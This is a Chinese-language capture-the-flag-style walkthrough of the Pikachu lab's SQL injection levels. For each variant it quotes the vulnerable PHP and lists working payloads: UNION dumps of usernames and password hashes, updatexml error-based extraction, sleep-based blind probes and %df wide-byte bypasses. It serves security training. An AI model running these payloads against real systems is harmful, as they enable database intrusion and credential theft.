# 概述

在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。**一个严重的SQL注入漏洞，可能会直接导致一家公司破产！**



SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。



在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：
1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；
2.使用参数化（Parameterized Query 或 Parameterized Statement）；
3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了"拼接"的方式,所以使用时需要慎重!



# 数字型注入(POST)

## 查看关键代码

```php
$link=connect();
$html='';

if(isset($_POST['submit']) && $_POST['id']!=null){
    //这里没有做任何处理，直接拼到select里面去了,形成Sql注入
    $id=$_POST['id'];
    $query="select username,email from member where id=$id";
    $result=execute($link, $query);
    //这里如果用==1,会严格一点
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $username=$data['username'];
            $email=$data['email'];
            $html.="<p class='notice'>hello,{$username} <br />your email is: {$email}</p>";
        }
    }else{
        $html.="<p class='notice'>您输入的user id不存在，请重新输入！</p>";
    }
}
```



通过代码可看到这里没有做任何处理，直接拼到select里面去了,形成Sql注入。

## 函数说明

```plain
isset() 函数用于检测变量是否已设置并且非 NULL。如果指定变量存在且不为 NULL，则返回 TRUE，否则返回 FALSE

语法
bool isset ( mixed $var [, mixed $... ] )
$var：要检测的变量。
```



```plain
mysqli_affected_rows() 函数返回前一次 MySQL 操作（SELECT、INSERT、UPDATE、REPLACE、DELETE）所影响的记录行数。一个 > 0 的整数表示所影响的记录行数。0 表示没有受影响的记录。-1 表示查询返回错误。

语法
mysqli_affected_rows(connection);
connection	必需。规定要使用的 MySQL 连接。
```



```plain
mysqli_fetch_assoc() 函数从结果集中取得一行作为关联数组。返回代表读取行的关联数组。如果结果集中没有更多的行则返回 NULL。

语法
mysqli_fetch_assoc(result);
result	必需。规定由 mysqli_query()、mysqli_store_result() 或 mysqli_use_result() 返回的结果集标识符。
```



## 实战

随意选择一个值使用burpsuite抓包，将抓到的包发送到Repeater

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882307743-a9d029f1-2749-444b-acf2-5e35351ed8e4.png)



输入

```plain
id=1'
```



报错，说明存在注入

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882315911-f1437c7f-1607-4961-a7dd-53af1934d31d.png)



判断字段数，输入

```plain
id=1 order by 3    报错
id=1 order by 22    成功
```



说明有两个字段

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882323439-ca0430a2-e3b0-489b-be03-ea518cfa3d0b.png)



查看回显字段，输入

```plain
id=-1 union select 1,2
```

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882329100-722c9b3d-abd4-4a67-a353-d24dfd330717.png)



查看当前数据库和用户，输入

```plain
id=-1 union select database(),user()
```

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882335669-27434202-568f-44dd-983b-32d7fa053be4.png)



查看所有表，输入

```plain
id=-1 union select database(),group_concat(table_name) from information_schema.tables where table_schema='pikachu'
```

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882341781-1b254f25-5918-4c22-85c9-67c99f160e48.png)



查看users表中的字段，输入

```plain
id=-1 union select database(),group_concat(column_name) from information_schema.columns where table_name='users'&submit=%E6%9F%A5%E8%AF%A2
```

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882348394-0a7990aa-7383-439a-9b5a-a4a5fcdc131f.png)



查看所有账户和密码，输入

```plain
id=-1 union select database(),group_concat(concat_ws('-',username,password)) from pikachu.users&submit=%E6%9F%A5%E8%AF%A2
```

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882353866-70572232-34c9-48b6-9f75-9093e119d4c3.png)

将md5的值进行解密即可得到密码



# 字符型注入(GET)

## 查看关键代码

```php
$link=connect();$html='';if(isset($_GET['submit']) && $_GET['name']!=null){    //这里没有做任何处理，直接拼到select里面去了    $name=$_GET['name'];    //这里的变量是字符型，需要考虑闭合    $query="select id,email from member where username='$name'";    $result=execute($link, $query);    if(mysqli_num_rows($result)>=1){        while($data=mysqli_fetch_assoc($result)){            $id=$data['id'];            $email=$data['email'];            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";        }    }else{        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";    }}
```



通过代码可看到这里依然是没有做任何处理，直接拼到select里面去了,形成Sql注入。



## 实战

SQL注入详情可以看sqli-labs系类，这里不进行详细叙述，直接爆账号和密码了。



输入

```plain
XMTX' union select database(),group_concat(concat_ws('-',username,password)) from pikachu.users --
```

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882378711-3f20be5d-40b0-4a07-8d01-5c2dfb9d619e.png)

将md5的值进行解密即可得到密码



# 搜索型注入

## 查看关键源码

```php
$link=connect();$html1='';$html2='';if(isset($_GET['submit']) && $_GET['name']!=null){    //这里没有做任何处理，直接拼到select里面去了    $name=$_GET['name'];    //这里的变量是模糊匹配，需要考虑闭合    $query="select username,id,email from member where username like '%$name%'";    $result=execute($link, $query);    if(mysqli_num_rows($result)>=1){        //彩蛋:这里还有个xss        $html2.="<p class='notice'>用户名中含有{$_GET['name']}的结果如下：<br />";        while($data=mysqli_fetch_assoc($result)){            $uname=$data['username'];            $id=$data['id'];            $email=$data['email'];            $html1.="<p class='notice'>username：{$uname}<br />uid:{$id} <br />email is: {$email}</p>";        }    }else{        $html1.="<p class='notice'>0o。..没有搜索到你输入的信息！</p>";    }}
```



通过代码可看到这里依然是没有做任何处理，直接拼到select里面去了,形成Sql注入，不过这里有一个闭合的问题。



## 实战

判断注入点，输入

```plain
XMTX'     报错XMTX'--   成功
```



说明存在注入

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882397993-cb2903cd-9ebb-44ca-80c5-b54f0e174b83.png)



查看字段数，输入

```plain
XMTX' order by 3--   成功 XMTX' order by 4--   报错
```



说明有三个字段

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882404034-285c2846-43e9-49ef-bef3-9a650f2ccf78.png)



查看回显字段，输入

```plain
XMTX' union select 1,2,3--
```

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882410347-3ac62e44-1f48-42f2-8daa-6a32b8ec1d06.png)



SQL注入详情可以看sqli-labs系类，这里不进行详细叙述，直接爆账号和密码了。

```plain
XMTX' union select 1,database(),group_concat(concat_ws('-',username,password)) from pikachu.users --
```

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882417047-9bb2ee61-c40c-4bbe-92b9-dacaf962f1da.png)

将md5的值进行解密即可得到密码



# XX型注入

## 查看关键代码

```php
if(isset($_GET['submit']) && $_GET['name']!=null){    //这里没有做任何处理，直接拼到select里面去了    $name=$_GET['name'];    //这里的变量是字符型，需要考虑闭合    $query="select id,email from member where username=('$name')";    $result=execute($link, $query);    if(mysqli_num_rows($result)>=1){        while($data=mysqli_fetch_assoc($result)){            $id=$data['id'];            $email=$data['email'];            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";        }    }else{        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";    }}
```



通过代码可看到这里依然是没有做任何处理，直接拼到select里面去了,形成Sql注入，不过这里有一个闭合的问题,	我们需要用到“）”。



## 实战

判断注入点，输入

```plain
XMTX'
```



并显示了一个“)”，说明存在注入。

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882437591-78ac0106-e3a4-47a4-a2ed-16a4ed08529f.png)



输入

```plain
XMTX')--
```

返回正常

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882443420-4b1f554f-bd06-443d-b7d5-32edd53e0f32.png)



查看字段数，输入

```plain
XMTX' order by 2--   成功 XMTX' order by 3--   报错
```



说明有两个字段

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882448638-236541a2-57a6-47b4-b18a-a5ea7e5978a7.png)



查看回显字段，输入

```plain
XMTX') union select 1,2--
```

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882454249-51af787d-9a34-444a-97a9-77e660871b5b.png)



SQL注入详情可以看sqli-labs系类，这里不进行详细叙述，直接爆账号和密码了。

```plain
XMTX' union select 1,database(),group_concat(concat_ws('-',username,password)) from pikachu.users --
```



将md5的值进行解密即可得到密码

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882464037-001a5099-eab9-4e6e-8470-a5176e651ab6.png)



# insert,update注入

## 查看关键代码

```php
$html='';if(isset($_POST['submit'])){    if($_POST['username']!=null &&$_POST['password']!=null){//      $getdata=escape($link, $_POST);//转义        //没转义,导致注入漏洞,操作类型为insert        $getdata=$_POST;        $query="insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),'{$getdata['sex']}','{$getdata['phonenum']}','{$getdata['email']}','{$getdata['add']}')";        $result=execute($link, $query);        if(mysqli_affected_rows($link)==1){            $html.="<p>注册成功,请返回<a href='sqli_login.php'>登录</a></p>";        }else {            $html.="<p>注册失败,请检查下数据库是否还活着</p>";        }    }else{        $html.="<p>必填项不能为空哦</p>";    }}
```



通过注册页面的代码可看到这里对输入的参没有进行转义来防注入， insert 注入是指我们前端注册的信息，后台会通过 insert 这个操作插入到数据库中。如果后台没对我们的输入做防 SQL 注入处理，我们就能在注册时通过拼接 SQL 注入。知道后台使用的是 insert 语句，我们一般可以通过 or 进行闭合。



## 实战

提交注册信息并使用burpsuite抓包

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882481179-253b2aef-ef09-4f81-b1d2-1dc0763bfdb1.png)



输入

```plain
XMTX'
```



报错，说明存在注入

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882487289-40a18c0b-1144-4d35-84c6-e19cf976f25c.png)



输入

```plain
XMTX' or updatexml(1,(concat(0x7e,database(),0x7e)),1) or '
```



爆出当前数据库

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882493130-ca27fbd4-e429-4543-88de-ef1e20fe376d.png)



SQL注入详情可以看sqli-labs系类，这里不进行详细叙述，直接爆账号和密码了。

```plain
XMTX' or updatexml(1,(concat(0x7e,(select concat_ws('-',username,password) from pikachu.users limit 0,1),0x7e)),1) or '
```



这里的输出不完整是因为报错注入对输出的字符数有限制

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882497983-a7ae6a24-6151-49e1-9984-15f93b387ac9.png)



可以输入

```plain
XMTX' or updatexml(1,(concat(0x7e,(select username from pikachu.users limit 0,1),0x7e)),1) or 'XMTX' or updatexml(1,(concat(0x7e,(select password from pikachu.users limit 0,1),0x7e)),1) or '
```



通过修改limit的参数来控制。



# delete注入

## 查看关键代码

```php
if(array_key_exists("message",$_POST) && $_POST['message']!=null){    //插入转义    $message=escape($link, $_POST['message']);    $query="insert into message(content,time) values('$message',now())";    $result=execute($link, $query);    if(mysqli_affected_rows($link)!=1){        $html.="<p>出现异常，提交失败！</p>";    }}// if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){//没对传进来的id进行处理，导致DEL注入if(array_key_exists('id', $_GET)){    $query="delete from message where id={$_GET['id']}";    $result=execute($link, $query);    if(mysqli_affected_rows($link)==1){        header("location:sqli_del.php");    }else{        $html.="<p style='color: red'>删除失败,检查下数据库是不是挂了</p>";    }}
```



通过源码可以看到没对传进来的id进行转义处理就直接代入SQL语句中，导致DEL注入。依然是使用报错注入。



## 函数说明

```plain
array_key_exists() 函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。语法array_key_exists(key,array)key	必需。规定键名。array	必需。规定数组。
```



## 实战

提交留言，然后点击删除，并使用burpsuite抓包

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882523548-4f1ea1d7-5a32-492e-a93b-9dcee11a2495.png)



输入

```plain
id=83'
```



报错，说明存在注入

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882530463-57fb6682-975c-48e8-8b81-edf4980b60f9.png)



输入

```plain
id=83+or+updatexml(1,(concat(0x7e,database(),0x7e)),1)
```



爆出当前数据库

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882536266-0b89993d-272c-452b-b802-d3272f4ae8a8.png)



SQL注入详情可以看sqli-labs系类，这里不进行详细叙述，直接爆账号和密码了。

```plain
id=83+or+updatexml(1,(concat(0x7e,(select+concat_ws('-',username,password)+from+pikachu.users+limit+0,1),0x7e)),1)
```



这里的输出不完整是因为报错注入对输出的字符数有限制

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882543332-b832f3e1-4f8e-48d1-8b0f-09f2b22cd0d7.png)



可以输入

```plain
id=83+or+updatexml(1,(concat(0x7e,(select+username+from+pikachu.users+limit+0,1),0x7e)),1)id=83+or+updatexml(1,(concat(0x7e,(select password from pikachu.users limit 0,1),0x7e)),1)
```



通过修改limit的参数来控制。



# http header注入

## 查看关键代码

```php
//这里把http的头信息存到数据库里面去了，但是存进去之前没有进行转义，导致SQL注入漏洞$query="insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values('$is_login_id','$remoteipadd','$useragent','$httpaccept','$remoteport')";$result=execute($link, $query);
```



废话不多说，直接开干。



## 实战

查看提醒可以知道账号和密码为admin/123456，输入用户名和密码登录

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882565019-d3ff6597-9e4a-49f7-835e-3f0e8ec82472.png)



可以看到返回显示user-Agent，那么可以判断出user-Agent处存在SQL注入

将user-Agent改为`'`,报错，说明存在注入

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882573848-06f5c596-67bb-4ebb-a5bf-b92f66d44b05.png)



输入

```plain
XMTX' or updatexml(1,concat(0x7e,database(),0x7e),1) or '
```



爆出当前数据库

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882578933-1caa84ff-3651-49c9-91d6-4c50aa8a2d2a.png)



SQL注入详情可以看sqli-labs系类，这里不进行详细叙述，直接爆账号和密码了。

```plain
XMTX' or updatexml(1,(concat(0x7e,(select concat_ws('-',username,password) from pikachu.users limit 0,1),0x7e)),1) or '
```



这里的输出不完整是因为报错注入对输出的字符数有限制

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882583608-11351106-5ca4-4659-aad9-c5ff5c219e3c.png)



可以输入

```plain
XMTX' or updatexml(1,(concat(0x7e,(select username from pikachu.users limit 0,1),0x7e)),1) or 'XMTX' or updatexml(1,(concat(0x7e,(select password from pikachu.users limit 0,1),0x7e)),1) or '
```



通过修改limit的参数来控制。



# 基于boolian的盲注

## 查看关键代码

```php
$html='';if(isset($_GET['submit']) && $_GET['name']!=null){    $name=$_GET['name'];//这里没有做任何处理，直接拼到select里面去了    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合    //mysqi_query不打印错误描述,即使存在注入,也不好判断    $result=mysqli_query($link, $query);////     $result=execute($link, $query);    if($result && mysqli_num_rows($result)==1){        while($data=mysqli_fetch_assoc($result)){            $id=$data['id'];            $email=$data['email'];            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";        }    }else{        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";    }}
```



通过源码可以看到没有做任何处理，直接将name参数拼到select里面去存在注入，但是使用了mysqli_query不回显错误，很明显的盲注。



## 实战

在前面我们知道用户vince是存在的，输入

```plain
vince ' and 1=1# 成功显示用户信息vince ' and 1=2# 报错
```



说明存在注入



判断数据库长度，输入

```plain
vince ' and length(database())=7# 成功显示用户信息vince ' and length(database())=8# 报错
```



说明数据库长度为7



SQL注入详情可以看sqli-labs系类，这里不进行详细叙述。



# 基于时间的盲注

## 查看关键代码

```php
$html='';if(isset($_GET['submit']) && $_GET['name']!=null){    $name=$_GET['name'];//这里没有做任何处理，直接拼到select里面去了    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合    $result=mysqli_query($link, $query);//mysqi_query不打印错误描述//     $result=execute($link, $query);//    $html.="<p class='notice'>i don't care who you are!</p>";    if($result && mysqli_num_rows($result)==1){        while($data=mysqli_fetch_assoc($result)){            $id=$data['id'];            $email=$data['email'];            //这里不管输入啥,返回的都是一样的信息,所以更加不好判断            $html.="<p class='notice'>i don't care who you are!</p>";        }    }else{        $html.="<p class='notice'>i don't care who you are!</p>";    }}
```



通过源码可以看到和前面一样依然是没有做任何处理，就直接拼到select里面去了，不也一样的是在这里无论我们输入什么返回的结果都一样并且在这里有一个闭合的问题，可使用#号注释。所以只能使用时间盲注。



## 实战

输入

```plain
vince' and sleep(5)#
```



发现页面延迟5秒才反应，说明存在注入



输入

```plain
vince' and if(length(database())=7,1,sleep(5))#  正常回显vince' and if(length(database())=8,1,sleep(5))#  延时5秒回显
```



正常回显



输入

```plain
vince' and if(substr((select database()),1,1)='p',1,sleep(5))#
```



正常回显说明数据库名称首字母为p



SQL注入详情可以看sqli-labs系类，这里不进行详细叙述。



# 宽字节注入

## 查看关键代码

```php
if(isset($_POST['submit']) && $_POST['name']!=null){    $name = escape($link,$_POST['name']);    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合    //设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题    $set = "set character_set_client=gbk";    execute($link,$set);    //mysqi_query不打印错误描述    $result=mysqli_query($link, $query);    if(mysqli_num_rows($result) >= 1){        while ($data=mysqli_fetch_assoc($result)){            $id=$data['id'];            $email=$data['email'];            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";        }    }else{        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";    }}
```



通过查看源码可以知道对name参数进行了转义然后拼接到SQL语句中，而且需要考虑闭合，可使用#号注释，因为设置mysql客户端来源编码是gbk,所以导致出现宽字节注入问题。



```plain
id=1’    =处理=>  1 \’  =进行编码=>  1%5c%27   =带入sql后=> id= \’ and XXXX    此时无法完成注入id=1%df’ =处理=> 1%df\’ =进行编码=> 1%df%5c%27 =带入sql后=> id=1運’ and XXX    此时存在宽字节注入漏洞
```



## 实战

输入`vince`并使用burpsuite抓包

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882654048-0ccf5706-2d4f-4113-85b0-5f14f7fc771e.png)



输入

```plain
vince' or 1=1#      报错vince%df' or 1=1#   成功
```



说明存在宽字节注入

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882660630-70d05fe3-49d2-477b-8912-0f2adb5d4f02.png)



输入

```plain
vince%df' order by 2#  成功vince%df' order by 3#  失败
```



说明存在两个字段



查看当前数据库，输入

```plain
vince%df' union select 1,database()#
```

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882669157-6df1120e-b42c-4d94-9ece-d6877d237ee0.png)



查看所有表，输入

```plain
vince%df'  union select version(),table_name from information_schema.tables where table_schema='pikachu'#
```



报错，将pikachu改为十六进制

```plain
vince%df'  union select version(),group_concat(table_name) from information_schema.tables where table_schema=0x70696b61636875#
```

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882676239-180d6da6-c9ec-4017-b373-5224f7b496ca.png)



SQL注入详情可以看sqli-labs系类，这里不进行详细叙述，直接爆账号和密码了。

```plain
vince%df'  union select version(),group_concat(concat_ws(0x7e,username,password)) from pikachu.users#
```

![img](../../_img/05-SQL%E6%B3%A8%E5%85%A5/1655882681954-0e246785-fd1e-4379-92f6-9ed2e9e66bf5.png)